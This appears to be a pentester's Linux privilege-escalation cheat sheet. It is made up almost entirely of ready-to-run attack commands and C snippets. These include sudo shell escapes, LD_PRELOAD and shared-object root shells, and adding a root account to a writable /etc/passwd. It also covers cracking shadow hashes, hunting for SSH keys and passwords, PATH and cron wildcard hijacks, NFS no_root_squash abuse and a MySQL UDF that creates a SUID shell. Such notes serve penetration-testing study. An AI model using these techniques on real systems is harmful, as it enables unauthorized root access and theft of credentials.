# Linux

## Test For Kernel Exploits

```
uname -a
```

```
cat /etc/issue
```

```
cat /etc/*-release
```

```
les.sh
```

## Test For sudo permissions

```
sudo -l
```

## General Scoping

```
grep -Ri 'db' /var/www --color=auto
```

```
grep -Ri 'sql' /var/www --color=auto
```

```
grep -Ri '$db_name' /var/www --color=auto
```

```
ls -lsa /tmp/
```

```
ls -lsa /dev/shm
```

```
ls -lsa /opt/
```

```
ls -lsa /
```

```
ls -ls /etc anything other than root:root root:fuse root:shadow root:dip
```

```
ls -lsa /etc | grep -i '.secret'
```

```
ls -lsaR /var/mail
```

```
ls -lsaR /var/spool/mail
```

```
ls -lsaR /home
```

```
mount
```

```
lsblk
```

```
cat /etc/fstab
```

## Vulnerable Driver Discovery

_List drivers_

```
lsmod
```

_get libata driver information and version_

```
modinfo libata
```

## Test SUDO

Reference https://gtfobins.github.io/

#### Nano

```
sudo find /bin -name nano -exec /bin/sh \;
```

#### Awk

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### Nmap

```
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
```

#### Vim

```
sudo vim -c '!sh'
```

#### LD\_PRELOAD

create file as malicious.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

compile and load

```
gcc -fPIC -shared -o /tmp/malicious.so malicious.c -nostartfiles
```

```
sudo LD_PRELOAD=/tmp/malicious.so apache2
```

#### Shared Object Injection

```
find / -type f -perm -04000 -ls 2>/dev/null
```

Run strace on SUIDs to find "foundso.so"

```
strace /usr/local/bin/SuidFromPreviousOutput 2>&1 | grep -i -E "open|access|no such file"
```

```
mkdir /home/user/.config
```

```
cd /home/user/.config
```

create foundso.c

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

```
gcc -shared -o /home/user/.config/foundso.so -fPIC /home/user/.config/foundso.c
/usr/local/bin/somesuid
```

```
sudo apache2 -f /etc/shadow
```

## Test SUID files

Reference https://gtfobins.github.io/ and google the rest not listed.

```
find / -perm /4000 2> /dev/null
```

## Test etc/passwd & etc/shadow

Test for readable / writeable /etc/passwd OR /etc/shadow

```
ls -la /etc/passwd /etc/shadow
```

#### Only if Both Readable

```
unshadow passwd shadow > unshadowed.txt
```

```
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

#### Writable etc/passwd

```
openssl passwd thescriptkid
```

```
echo 'thescriptkid:$1$ZEx4UyBv$/2BpqiGuy7vuNC7X9SsTO0:0:0:thescriptkid:/home/thescriptkid:/bin/bash' >> /etc/passwd
```

```
su thescriptkid
```

## Stored Passwords & Keys

#### OVPN Files

```
find / -iname "*.ovpn" 2> /dev/null
```

#### Irssi Files

```
find / -iname "config" 2> /dev/null | grep -i "irssi"
```

```
cat filename | grep -i passw
```

#### Bash History

```
cat /home/*/.bash_history | grep -i passw
```

#### SSH Keys

```
find / -name id_rsa 2> /dev/null
```

```
chmod 400 id_rsa
```

```
ssh -i id_rsa someuser@$ip
```

## Abusing Intended Functionality

**Symlinks**

**Nginx below 1.6.2-5+deb8u3** [**logrotate Local Privilege Escalation**](https://www.exploit-db.com/exploits/40768)

## Environment Variables

#### Path

```
find / -type f -perm -04000 -ls 2>/dev/null
```

```
strings /usr/local/bin/onfoundsuid
```

C functions such as setresgid, setresuid, and system are of interest and should be investigated. Relative path commands such as "service" apache2 start can be abused.

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

```
gcc /tmp/service.c -o /tmp/service
```

```
export PATH=/tmp:$PATH
```

```
/usr/local/bin/onfoundsuid
```

## Functions, ShellOpts & PS4

```
find / -type f -perm -04000 -ls 2>/dev/null
```

```
strings /usr/local/bin/onfoundsuid
```

C functions such as setresgid, setresuid, and system are of interest and should be investigated. Absolute or Relative path commands such as "service" can be abused by creating functions in the current shell session.

Method 1

```
function /usr/sbin/onfoundsuid() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```

```
export -f /usr/sbin/service
```

```
/usr/local/bin/onfoundsuid
```

Method 2

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && 
```

```
chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/onfoundsuid; set +x; /tmp/bash -p'
```

## Capabilities

```
getcap -r / 2>/dev/null
```

#### Python 2.6

```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Cron

```
cat /etc/crontab
```

```
ls /etc/cron.d
```

```
cat /var/spool/cron/crontabs/root
```

#### Path

_This abuses misconfigured path in "/etc/crontab". If a user has write permissions in the directory that is in the path. create a file with the same name as the cronjob with malicious contents._

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /writeable/directory/somefile
```

```
chmod +x /wrietable/directory/somefile
```

```
/tmp/bash -p
```

#### Wildcards

```
cat /etc/crontab
```

#### **Tar**

_Exploitable if cronjob script that is using tar and has a wildcard \* Example: tar czf /tmp/backup.tar.gz_

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
/home/user/--checkpoint=1
```

```
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

_Wait for execution_

```
/tmp/bash -p
```

#### File Overwrite

```
cat /etc/crontab
```

_Exploitable if script is writeable by the current user_

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/writable/writablescript
```

```
/tmp/bash -p
```

## NFS Root Squashing

_Victim Machine_

```
cat /etc/exports
```

_Kali Machine_

```
showmount -e ip
```

```
mount -o rw,vers=2 ip:/tmp /tmp/1
```

{% code overflow="wrap" %}
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/thescriptkid.c
```
{% endcode %}

```
gcc /tmp/1/x.c -o /tmp/1/thescriptkid
```

```
chmod +s /tmp/1/thescriptkid
```

_Victim Machine_

```
/tmp/thescriptkid
```

## Mysql

_prequisites - a valid database_

```
show databases;
```

```
CREATE FUNCTION sys_eval RETURNS INT SONAME 'lib_mysqludf_sys.so';
```

```
select sys_eval("cp /bin/bash /var/tmp/bash ; chmod u+s /var/tmp/bash");
```

```
/var/tmp/bash -p
```

## Run LinPEAS

_try passwords found in config PHP files_
